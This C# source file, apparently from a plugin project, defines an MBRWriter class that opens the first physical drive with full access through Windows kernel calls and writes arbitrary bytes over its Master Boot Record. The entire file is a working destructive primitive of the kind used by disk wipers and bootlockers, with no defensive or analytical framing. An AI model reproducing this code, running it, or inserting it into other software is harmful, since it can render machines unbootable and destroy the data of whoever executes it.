using System;
using System.Runtime.InteropServices;

namespace TestPlugin
{
	/// <summary>
	/// Provides functionality to write directly to the Master Boot Record (MBR) of the physical drive.
	/// This class utilizes Windows API kernel functions to handle file creation and writing operations.
	/// </summary>
	internal class MBRWriter
	{
		#region Imports

		[DllImport("kernel32")]
		private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
			IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes,
			IntPtr hTemplateFile);

		[DllImport("kernel32")]
		private static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
			out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

		#endregion

		IntPtr _handle;

		public MBRWriter()
		{
			_handle = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 0x3, IntPtr.Zero, 0x3, 0, IntPtr.Zero);
			if (_handle == (IntPtr)(-0x1))
				throw new AccessViolationException();
		}

		/// <summary>
		/// Writes the specified byte array to the Master Boot Record (MBR) of the physical drive.
		/// </summary>
		/// <param name="bytes">The byte array containing the data to be written to the MBR.</param>
		/// <returns>
		/// A boolean value indicating whether the write operation was successful.
		/// Returns true if the write operation succeeded, otherwise false.
		/// </returns>
		public bool Write(byte[] bytes)
		{
			return WriteFile(_handle, bytes, (uint)bytes.Length, out var _, IntPtr.Zero);
		}
	}
}